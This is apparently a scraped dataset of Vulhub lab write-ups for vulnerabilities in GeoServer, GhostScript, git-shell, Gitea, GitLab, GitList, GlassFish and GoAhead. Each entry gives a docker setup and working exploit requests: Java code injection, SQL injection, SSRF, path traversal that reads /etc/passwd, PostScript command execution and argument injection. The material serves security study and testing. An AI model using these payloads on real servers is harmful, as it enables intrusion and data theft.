Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 356

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'
  <wfs:Query typeNames='sf:archsites'/
  <wfs:valueReferenceexec(java.lang.Runtime.getRuntime(),'touch /tmp/success2')</wfs:valueReference
</wfs:GetPropertyValue


The familiar java.lang.ClassCastException error:



As you can see, touch /tmp/success1 and touch /tmp/success2 are both executed successfully.



It is important to mention that typeNames parameter must exist. You can find all the available Types on the web server without login:
-------------------------------------------------------------------------------","https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv
https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w
https://tttang.com/archive/1771/
https://github.com/Warxim/CVE-2022-41852"
geoserver,CVE-2022-24816,GeoServer Remote Code Injection caused by JAI-EXT (CVE-2022-24816/CVE-2023-35042),"GeoServer Remote Code Injection caused by JAI-EXT (CVE-2022-24816/CVE-2023-35042)

中文版本(Chinese version)

GeoServer is an open-source software server written in Java that provides the ability to view, edit, and share geospatial data. It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as Geographic Information System (GIS) databases, web-based data, and personal datasets.

GeoServer uses the Jiffle map algebra language provided by JAI-EXT, which allows efficiently execute map algebra over large images. A code injection vulnerability (CVE-2022-24816) has been found in JAI-EXT versions 1.2.21 and earlier, that allows a remote code execution to be performed by properly crafting a Jiffle invocation.

When this vulnerability affects GeoServer, it is also known as CVE-2023-35042. GeoServer versions 2.20.4, 2.19.6, and 2.18.6 and later have fixed this vulnerability by updating the JAI-EXT dependency.

References:
<https://www.synacktiv.com/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver
<https://github.com/geosolutions-it/jai-ext/security/advisories/GHSA-v92f-jx6p-73rx
<https://geoserver.org/vulnerability/2022/04/11/geoserver-2-jiffle-jndi-rce.html
<https://osgeo-org.atlassian.net/browse/GEOS-10458
<https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2022/CVE-2022-24816.yaml

Vulnerable Environment

Execute the following command to start a GeoServer 2.17.2 server:


docker compose up -d


After the server is started, you can browse the default page of GeoServer at http://your-ip:8080/geoserver.

Exploit

The vulnerability exists in the WMS endpoint. An attacker can execute arbitrary Java code by sending a specially crafted request to /geoserver/wms. The request should include a malicious Jiffle expression that will be evaluated by the server.

Send a request like this to exploit the vulnerability:


POST /geoserver/wms HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 2191

<?xml version=""1.0"" encoding=""UTF-8""?
<wps:Execute version=""1.0.0"" service=""WPS"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns=""http://www.opengis.net/wps/1.0.0"" xmlns:wfs=""http://www.opengis.net/wfs"" xmlns:wps=""http://www.opengis.net/wps/1.0.0"" xmlns:ows=""http://www.opengis.net/ows/1.1"" xmlns:gml=""http://www.opengis.net/gml"" xmlns:ogc=""http://www.opengis.net/ogc"" xmlns:wcs=""http://www.opengis.net/wcs/1.1.1"" xmlns:xlink=""http://www.w3.org/1999/xlink"" xsi:schemaLocation=""http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd""
<ows:Identifierras:Jiffle</ows:Identifier
<wps:DataInputs
    <wps:Input
    <ows:Identifiercoverage</ows:Identifier
    <wps:Data
        <wps:ComplexData mimeType=""application/arcgrid""<![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]</wps:ComplexData
    </wps:Data
    </wps:Input
    <wps:Input
    <ows:Identifierscript</ows:Identifier
    <wps:Data
        <wps:LiteralDatadest = y() - (500); // / public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(""id"").getInputStream())); String line = null; String allLines = "" - ""; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /*</wps:LiteralData
    </wps:Data
    </wps:Input
    <wps:Input
    <ows:IdentifieroutputType</ows:Identifier
    <wps:Data
        <wps:LiteralDataDOUBLE</wps:LiteralData
    </wps:Data
    </wps:Input
</wps:DataInputs
<wps:ResponseForm
    <wps:RawDataOutput mimeType=""image/tiff""
    <ows:Identifierresult</ows:Identifier
    </wps:RawDataOutput
</wps:ResponseForm
</wps:Execute


After sending this request, the malicious Java code embedded in the Jiffle script will be executed by the server. The command output will be captured and returned to the client within a java.lang.ExceptionInInitializerError message:
-------------------------------------------------------------------------------","https://www.synacktiv.com/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver
https://github.com/geosolutions-it/jai-ext/security/advisories/GHSA-v92f-jx6p-73rx
https://geoserver.org/vulnerability/2022/04/11/geoserver-2-jiffle-jndi-rce.html
https://osgeo-org.atlassian.net/browse/GEOS-10458
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2022/CVE-2022-24816.yaml
http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd"">"
geoserver,CVE-2021-40822,GeoServer Unauthenticated Server-Side Request Forgery (CVE-2021-40822),"GeoServer Unauthenticated Server-Side Request Forgery (CVE-2021-40822)

中文版本(Chinese version)

GeoServer is an open-source software server written in Java that provides the ability to view, edit, and share geospatial data. It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as Geographic Information System (GIS) databases, web-based data, and personal datasets.

In GeoServer versions prior to 2.19.3, 2.18.5, and 2.17.6, there is a Server-Side Request Forgery (SSRF) vulnerability in the WMS GetMap request. An attacker can exploit this vulnerability to make requests to internal or external services through the GeoServer server.

References:
<https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
<https://nvd.nist.gov/vuln/detail/CVE-2021-40822

Vulnerable Environment

Execute the following command to start a GeoServer 2.19.1 server:


docker compose up -d


After the server is started, you can browse the default page of GeoServer at http://your-ip:8080/geoserver.

Exploit

The vulnerability exists in the TestWfsPost endpoint. An attacker can use the url parameter to make the server send requests to arbitrary URLs. The endpoint accepts several parameters:
url: The target URL that GeoServer will send request to
body: The request body to be sent. If this parameter is empty, GeoServer will send a GET request; if it contains any value, GeoServer will send a POST request
username: Username for basic authentication (optional)
password: Password for basic authentication (optional)

Send the following request to the TestWfsPost endpoint:


POST /geoserver/TestWfsPost HTTP/1.1
Host: internal
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 96

formhf0=&url=http://interal/geoserver/../&body=testtest&username=admin&password=admin


Use google.com as the target URL, and you will see that response from google.com is returned.



Note: The host in the url parameter must match the Host header in your request, otherwise GeoServer will return an error. For example, if the domain in url parameter is internal, then the Host header should also be internal.
-------------------------------------------------------------------------------","https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
https://nvd.nist.gov/vuln/detail/CVE-2021-40822"
geoserver,CVE-2023-25157,GeoServer OGC Filter SQL Injection (CVE-2023-25157),"GeoServer OGC Filter SQL Injection (CVE-2023-25157)

中文版本(Chinese version)

GeoServer is an open-source software server written in Java that provides the ability to view, edit, and share geospatial data. It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as Geographic Information System (GIS) databases, web-based data, and personal datasets.

In the version prior to 2.22.1 and 2.21.4, there is a SQL injection issue that was found in the filter and function expressions defined by the Open Geospatial Consortium (OGC) standards.

References:
<https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158
<https://github.com/advisories/GHSA-7g5f-wrx8-5ccf

Vulnerable environment

Execute following command to start a GeoServer instance 2.22.1:


docker compose up -d


After the server is started, you can browse the default page of GeoServer at http://your-ip:8080/geoserver.

Exploit

First of all, you have to find a existing workspace that contains PostGIS datastore before you exploit the vulnerability. Vulhub's GeoServer instance already have a PostGIS datastore:
Workspace name: vulhub
Data store name: pg
Feature type (table) name: example
One of attribute from feature type: name

Exploit the server by this simple URL:


http://your-ip:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true




As you can see, the version of PostgreSQL has been retrieved from GeoServer by SQL injection.
-------------------------------------------------------------------------------","https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158
https://github.com/advisories/GHSA-7g5f-wrx8-5ccf"
ghostscript,CVE-2018-16509,GhostScript Sandbox Bypass Command Execution (CVE-2018-16509),"GhostScript Sandbox Bypass Command Execution (CVE-2018-16509)

中文版本(Chinese version)

GhostScript is a suite of software based on an interpreter for Adobe Systems' PostScript and PDF page description languages. It is widely used by many image processing libraries such as ImageMagick and Python PIL.

On August 21st, 2018, security researcher Tavis Ormandy disclosed that GhostScript's security sandbox could be bypassed through maliciously crafted image content, leading to command execution, file reading, and file deletion vulnerabilities.

References:
<http://seclists.org/oss-sec/2018/q3/142
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1640

Environment Setup

Execute the following command to start a vulnerable environment (including GhostScript 9.23 and ImageMagick 7.0.8):


docker compose up -d


After the server is started, visit http://your-ip:8080 to see an upload component.

Vulnerability Reproduction

Upload poc.png to execute the command id /tmp/success && cat /tmp/success. Enter the container using docker compose exec web bash, and you will see that /tmp/success has been created.



You can also test this vulnerability using the command line:


docker run -it --rm --name im -v pwd/poc.png:/poc.png vulhub/imagemagick:7.0.8-10 convert /poc.png /poc.gif


The command execution result shows that the id command has been successfully executed.
-------------------------------------------------------------------------------","http://seclists.org/oss-sec/2018/q3/142
https://bugs.chromium.org/p/project-zero/issues/detail?id=1640"
ghostscript,CVE-2018-19475,GhostScript Sandbox Bypass Command Execution (CVE-2018-19475),"GhostScript Sandbox Bypass Command Execution (CVE-2018-19475)

中文版本(Chinese version)

GhostScript is a suite of software based on an interpreter for Adobe Systems' PostScript and PDF page description languages. It is widely used by many image processing libraries.

In late 2018, Man Yue Mo from the Semmle Security Research Team published a variant of CVE-2018-16509, designated as CVE-2018-19475. This vulnerability allows attackers to bypass GhostScript's sandbox through a malicious image and execute arbitrary commands in gs versions prior to 9.26.

References:
<https://blog.semmle.com/ghostscript-CVE-2018-19475/
<https://bugs.ghostscript.com/show_bug.cgi?id=700153

Environment Setup

Execute the following command to start a vulnerable environment (including GhostScript 9.25 and ImageMagick 7.0.8-20):


docker compose up -d


After the server is started, visit http://your-ip:8080 to see an upload component.

Vulnerability Reproduction

Upload the POC as an image to execute the command id /tmp/success && cat /tmp/success:


POST /index.php HTTP/1.1
Host: target
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryukZmnyhO
Content-Length: 279
-----WebKitFormBoundaryukZmnyhO
Content-Disposition: form-data; name=""file_upload""; filename=""1.jpg""
content-Type=""image/png""

%!PS
0 1 300367 {} for
{save restore} stopped {} if
(%pipe%id /tmp/success && cat /tmp/success) (w) file
-----WebKitFormBoundaryukZmnyhO--


As you can see, the command will be successfully executed.



In real-world scenarios, you may need to use out-of-band techniques to detect the vulnerability as direct output may not be available.
-------------------------------------------------------------------------------","https://blog.semmle.com/ghostscript-CVE-2018-19475/
https://bugs.ghostscript.com/show_bug.cgi?id=700153"
ghostscript,CVE-2019-6116,GhostScript Sandbox Bypass Command Execution (CVE-2019-6116),"GhostScript Sandbox Bypass Command Execution (CVE-2019-6116)

中文版本(Chinese version)

GhostScript is a suite of software based on an interpreter for Adobe Systems' PostScript and PDF page description languages. It is widely used by many image processing libraries such as ImageMagick and Python PIL.

On January 23rd, 2019, Artifex officially merged six fixes into the master branch of GhostScript to address CVE-2019-6116. This vulnerability was reported by Google security researcher Tavis on December 3rd, 2018. The vulnerability allows attackers to bypass GhostScript's security sandbox, leading to arbitrary command execution and file reading capabilities.

References:
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&desc=2
<https://www.anquanke.com/post/id/170255

Environment Setup

Execute the following command to start a vulnerable environment (including GhostScript 9.26 and ImageMagick 7.0.8-27):


docker compose up -d


After the server is started, visit http://your-ip:8080 to see an upload component.

Vulnerability Reproduction

Upload the provided POC file to execute the command id /tmp/success.



You can also test this vulnerability using the command line:


docker run -it --rm --name uu -v pwd/poc.png:/tmp/poc.png vulhub/imagemagick:7.0.8-27-php identify /tmp/poc.png


The command will be successfully executed.
-------------------------------------------------------------------------------","https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&desc=2
https://www.anquanke.com/post/id/170255"
git,CVE-2017-8386,GIT-SHELL Sandbox Bypass Leads to RCE (CVE-2017-8386),"GIT-SHELL Sandbox Bypass Leads to RCE (CVE-2017-8386)

中文版本(Chinese version)

Git shell is a login shell for SSH accounts to provide restricted Git access. git-shell in git before 2.4.12, 2.5.x before 2.5.6, 2.6.x before 2.6.7, 2.7.x before 2.7.5, 2.8.x before 2.8.5, 2.9.x before 2.9.4, 2.10.x before 2.10.3, 2.11.x before 2.11.2, and 2.12.x before 2.12.3 might allow remote authenticated users to bypass the git-shell sandbox and execute arbitrary commands, after leveraging a less command-line-based command execution vulnerability.

References:
https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/
https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html

Environment Setup

Run the following command to start a SSH server that has a git-shell login shell:


docker compose up -d


To avoid port conflicts with the Docker host's SSH port, Vulhub sets the container's SSH port to 3322. In this directory, Vulhub has generated an id_rsa file, which is the SSH private key that you need to specify when connecting.

Before connecting, you need to set the private key permissions to 0600: chmod 0600 id_rsa, otherwise the connection may fail.

When normally connecting to its SSH service ssh -p 3322 -i id_rsa git@127.0.0.1, you will be intercepted by git-shell, returning the error fatal: unrecognized command '', and the connection will be closed.

Vulnerability Reproduction

Use the --help trick to connect to the target and enter the help page:


ssh -p 3322 -i id_rsa -t git@127.0.0.1 ""git-upload-archive '--help'""


Press shift+e to read arbitrary files:



Return to the help page, enter !id to execute commands:



(Why is it the www-data user? Because the git user and www-data user both have ID 33, so they are actually the same user)

Principle

Git Pull Process Based on SSH Protocol

git-shell is an important component of git services. As we know, git services support three protocols for project transmission: SSH, git, and HTTPS, among which SSH is the most secure and convenient.

If we open any project on Github and find the address listed in Clone with SSH: git@github.com:phith0n/vulhub.git, this URL actually tells git that the SSH username is git, the address is github.com (default port is 22), and the project is located in the phith0n/vulhub.git directory; then git connects to github.com via SSH protocol and pulls the project from the corresponding directory.

Therefore, git clone and other operations based on SSH protocol are essentially processes of connecting to the git server via SSH protocol and pulling from the specified directory.

So, since this is an SSH interactive process, can I directly execute ssh git@github.com to log in to the github server? Obviously not, you can try:



Saying ""not possible"" is actually not entirely accurate. I did connect to its SSH service and pass authentication, but it gave me a prompt message ""Hi phith0n! You've successfully authenticated, but GitHub does not provide shell access."" and then closed my connection.

Therefore, normally, the git pull process based on SSH is secure for the git server.

For information on how to set up a git server, you can refer to this article

How to Prevent Git Users from Executing System Shell

So, how do git service providers like GitHub implement the above ""secure"" communication process?

There are two ways to allow users to authenticate via SSH but not give them a shell:

1. Set the shell to git-shell when creating the system user git
2. Set command in the authorized_keys file before each ssh-key to override or hijack the original command

The first method is more straightforward - when creating the user, instead of giving them a normal bash or sh shell, give them a git-shell. git-shell is a sandbox environment where only commands included in the sandbox can be executed.

The second method is not only used on git servers but also in many Linux distributions. For example, AWS by default does not allow root login, implemented by setting command=""echo 'Please login as the user \""ec2-user\"" rather than the user \""root\"".';echo;sleep 10"" in /root/.ssh/authorized_keys. This effectively overrides the original shell execution with an echo command.

Of course, git-shell can also be used within the second method. For example, when adding a git user, give them a normal /bin/bash but set command=""git-shell -c \""$SSHORIGINALCOMMAND\"""" in authorized_keys, which still effectively uses git-shell.

git-shell Sandbox Bypass Vulnerability (CVE-2017-8386)

git-shell is a shell that can restrict user command execution. If we create a new directory called git-shell-commands in the git user's home directory and put the commands you allow users to execute in this directory, we've created a sandbox. In git-shell, only commands in the /home/git/git-shell-commands directory can be executed.

If the system doesn't have a git-shell-commands directory, then git-shell by default only allows the execution of these three commands:
git-receive-pack <argument
git-upload-pack <argument
git-upload-archive <argument

This is the whitelist.

However, the author of CVE-2017-8386 discovered that executing git-upload-archive --help (or git-receive-pack --help) will enter an interactive man page, which calls the less command, resulting in a help document that can be scrolled up and down.

This seems harmless, but the less command has a feature that supports some interactive methods. For example, in the less page, pressing shift+e opens the Examine function, through which arbitrary files can be read; entering !id can execute the id command.

You can try this on any Linux computer - execute less /etc/passwd to get to the less page, then in English input mode, type !id, and you can execute the id command:



So, using this feature, we can bypass the git-shell sandbox to read arbitrary files or execute arbitrary commands!

We can first try executing git-receive-pack --help directly in Linux, then enter !id, and we'll see similar effects to the above image.

evi1cg's blog has animated GIFs that make this more intuitive.

Exploitation via SSH

So, how do we exploit this vulnerability remotely?

We tried earlier that directly using ssh git@gitserver only gets us git-shell (or returns a reminder message), so we'll use the sandbox bypass vulnerability mentioned in the previous section to execute commands:


ssh -p 3322 -i id_rsa -t git@127.0.0.1 ""git-upload-archive '--help'""


Enter the help page, then press shift+e or enter !id.

Some Limitations

As mentioned earlier, there are two ways to configure git users to prevent SSH shell access: one is to set their shell to /usr/bin/git-shell when creating the user, and the other is to override the command in authorized_keys.

If the target server uses the first method, even if we successfully execute git-upload-archive '--help' and enter the help page, we still can't execute commands. This is because !id is still executed under git-shell, and since git-shell doesn't have the id command, it still won't succeed.

However, reading files is always possible because file reading is not done through commands, so it's not affected by the git-shell sandbox.

If the target server configures git-shell using the second method, like in this test environment where I set the git user's shell to bash in the /etc/passwd file but override the command in authorized_keys to execute git-shell.

In this case, if we enter the help page and input !id, we can successfully execute the id command because it's executed under bash rather than git-shell, so there are no sandbox restrictions.

In summary, this vulnerability can at least achieve arbitrary file reading, and potentially arbitrary command execution.
-------------------------------------------------------------------------------","https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/
https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html"
gitea,Unknown,Gitea 1.4.0 Directory Traversal Leading to Remote Command Execution,"Gitea 1.4.0 Directory Traversal Leading to Remote Command Execution

中文版本(Chinese version)

Gitea is an open-source project forked from Gogs, providing a self-hosted platform similar to Github and Gitlab for managing Git repositories with multiple users. In version 1.4.0, there is a logic error that allows unauthorized users to traverse directories, read and write arbitrary files, ultimately leading to arbitrary command execution.

References:
https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html
https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html

Environment Setup

Execute the following command to start the vulnerable Gitea 1.4.0:


docker compose up -d


After the server starts, visit http://your-ip:3000 to enter the installation page. Fill in the administrator account and password, modify the website URL, and keep other settings as default. (Do not modify the port number)

After installation, create a public repository and add some files to it (for example, initialize the repository with selected files and templates):



Then, you need to execute docker compose restart to restart the Gitea service. (For the reason, see the second reference link)

Vulnerability Reproduction

Since the vulnerability chain is quite complex overall, we will only reproduce the file reading part. For the remaining exploitation methods, please refer to the second reference link.

Open Gitea, find the public project you just created, such as vulhub/repo, and send the following data packet to add a Git LFS object:


POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
Host: your-ip:3000
Accept-Encoding: gzip, deflate
Accept: application/vnd.git-lfs+json
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 151

{
    ""Oid"": ""....../../../etc/passwd"",
    ""Size"": 1000000,
    ""User"" : ""a"",
    ""Password"" : ""a"",
    ""Repo"" : ""a"",
    ""Authorization"" : ""a""
}


Then, visit http://your-ip:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth, and you can see that /etc/passwd has been successfully read:
-------------------------------------------------------------------------------","https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html
https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html"
gitlab,CVE-2016-9086,GitLab Arbitrary File Disclosure (CVE-2016-9086),"GitLab Arbitrary File Disclosure (CVE-2016-9086)

中文版本(Chinese version)

GitLab is a web-based DevOps lifecycle tool that provides a Git repository manager providing wiki, issue-tracking and continuous integration and deployment pipeline features.

Jobert Abma from HackerOne disclosed a critical security flaw in the ""import/export project"" feature of GitLab. Added in GitLab 8.9, this feature allows a user to export and then re-import their projects as tape archive files (tar). All GitLab versions prior to 8.13.0 restricted this feature to administrators only. Starting with version 8.13.0 this feature was made available to all users.

This feature did not properly check for symbolic links in user-provided archives and therefore it was possible for an authenticated user to retrieve the contents of any file accessible to the GitLab service account. This included sensitive files such as those that contain secret tokens used by the GitLab service to authenticate users. Please see the issue for more details.

References:
https://about.gitlab.com/releases/2016/11/02/cve-2016-9086-patches/
https://hackerone.com/reports/178152
http://paper.seebug.org/104/

Vulnerable environment

Execute following command to start a GitLab Community Server 8.13.1:


docker compose up -d


After the server is started, browse the http://your-ip:8080 to see the website, the credentials of default administrator account are root and vulhub123456.

Exploit

Signup and signin an account, then click the ""GitLab export"" button on the project creation page:



Uploaded the file test.tar.gz, and the file /etc/passwd is disclosed:
-------------------------------------------------------------------------------","https://about.gitlab.com/releases/2016/11/02/cve-2016-9086-patches/
https://hackerone.com/reports/178152
http://paper.seebug.org/104/"
gitlab,CVE-2021-22205,GitLab Pre-Auth Remote Command Execution (CVE-2021-22205),"GitLab Pre-Auth Remote Command Execution (CVE-2021-22205)

中文版本(Chinese version)

GitLab is a web-based DevOps lifecycle tool that provides a Git repository manager providing wiki, issue-tracking and continuous integration and deployment pipeline features.

An issue has been discovered in GitLab CE/EE affecting the versions starting from 11.9. GitLab was not properly validating image files that is passed to a file parser which resulted in an unauthenticated remote command execution.

References:
https://hackerone.com/reports/1154542
https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html
https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/
https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml

Vulnerable environment

Execute following command to start a GitLab Community Server 13.10.1:


docker compose up -d


After the server is started, browse the http://your-ip:8080 to see the website.

Exploit

The api endpoint /uploads/user is an unauthenticated interface. Attack the server through the poc.py:


python poc.py http://your-ip:8080 ""touch /tmp/success""




touch /tmp/success has been executed successfully:
-------------------------------------------------------------------------------","https://hackerone.com/reports/1154542
https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html
https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/
https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml
http://your-ip:8080"
gitlist,CVE-2018-1000533,GitList 0.6.0 Remote Command Execution (CVE-2018-1000533),"GitList 0.6.0 Remote Command Execution (CVE-2018-1000533)

中文版本(Chinese version)

GitList is an elegant and modern git repository viewer.

GitList version <= 0.6 contains a passing incorrectly sanitized input to system function vulnerability in searchTree function that can result in executing arbitrary commands as PHP user. This attack appear to be exploitable via POST request using search form.

References:
<https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322
<https://www.exploit-db.com/exploits/44548
<https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html

Vulnerable environment

Execute following command to start a GitList server 0.6.0:


docker compose up -d


After the server is started, browse the http://your-ip:8080 and you will see a repository named example.

Vulnerability Principle

GitList uses git grep while searching code in repository:

php
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }

    $query = escapeshellarg($query);

    try {
        $results = $this-getClient()-run($this, ""grep -i --line-number {$query} $branch"");
    } catch (\RuntimeException $e) {
        return false;
    }


$query is the search keyword, $branch is the target branch.

id will be executed if attacker passed --open-files-in-pager=id; as the $query's value:



There are two reasons for this vulnerability:

1. Misunderstanding of the escapeshellarg function, resulting in arguments injection
2. The value of the --open-files-in-pager argument of git grep, which will be directly executed

Theoretically, after $query = escapeshellarg($query);, $query will become a string wrapped in single quotes. The premise of the bug is that the string should appear in the “parameter value” position, not in the parameter option.

To fix this issue, we can put the $query option behind -e:


git grep -i --line-number -e '--open-files-in-pager=id;' master




This is the suggestion from Git official:

-e
The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by
or.

GitList used another fix:

php
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }
    $query = preg_replace('/(--?[A-Za-z0-9\-]+)/', '', $query);
    $query = escapeshellarg($query);
    try {
        $results = $this-getClient()-run($this, ""grep -i --line-number -- {$query} $branch"");
    } catch (\RuntimeException $e) {
        return false;
    }


Firstly, remove illegal - prefix from $query, then put it behind --. The double-dash (--) will be accepted as a delimiter indicating the end of options in command line.

A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.

If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash's exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script.

So this this patch is acceptable, except that the preg_replace in the first step affects the normal search function.

Exploit

Send following request:


POST /example/tree/a/search HTTP/1.1
Host: your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8
Content-Length: 56

query=--open-files-in-pager=touch /tmp/success;


Noted that there are two arguments in URL: /[reponame]/tree/[keyword]/search. [reponame] must be a existing repository in the GitList, [keyword] is a search keyword that produces at least one result.

After the request is sent, use docker compose exec web bash to enter the container and you can see that /tmp/success has been successfully created:
-------------------------------------------------------------------------------","https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322
https://www.exploit-db.com/exploits/44548
https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html"
gitlist,Unknown,"redirect to gitlist/CVE-2018-1000533
-------------------------------------------------------------------------------","redirect to gitlist/CVE-2018-1000533
-------------------------------------------------------------------------------",
glassfish,CVE-2017-1000028,GlassFish 4.1.0 Arbitrary File Read (CVE-2017-1000028),"GlassFish 4.1.0 Arbitrary File Read (CVE-2017-1000028)

中文版本(Chinese version)

GlassFish is an open-source application server for the Java EE platform. A vulnerability in GlassFish allows attackers to read arbitrary files through UTF-8 Overlong Encoding attack.

The vulnerability exists because GlassFish does not properly handle UTF-8 Overlong Encoding when decoding URLs. As a result, %c0%ae is decoded as the ASCII character . (dot). By using %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/ in the URL, an attacker can traverse directories and read arbitrary files on the system.

References:
<https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904
<https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html

Environment Setup

Execute the following command to start a GlassFish server 4.1:


docker compose up -d


After the server starts, you can access GlassFish Admin Console on http://your-ip:4848.

Vulnerability Reproduction

Visit the following URL to read the contents of /etc/passwd:


https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd




Additional Notes

The super administrator password is set in docker-compose.yml, with a default value of vulhubdefaultpassword. You can use this password to log in to the admin account on port 4848.
-------------------------------------------------------------------------------","https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904
https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html"
goahead,CVE-2021-42342,GoAhead Web Server Environment Variables Injection and LD_PRELOAD Remote Code Execution (CVE-2021-42342),"GoAhead Web Server Environment Variables Injection and LD_PRELOAD Remote Code Execution (CVE-2021-42342)

中文版本(Chinese version)

An issue was discovered in GoAhead 4.x and 5.x before 5.1.5. In the file upload filter, user form variables can be passed to CGI scripts without being prefixed with the CGI prefix. This permits tunneling untrusted environment variables into vulnerable CGI scripts.

Attacker can use this feature to upload their shared object payload in the multipart form and hijack the LD_PRELOAD environment variable to execute arbitrary code.

This vulnerability is the patch bypass of the CVE-2017-17562.

References:
https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562
https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/
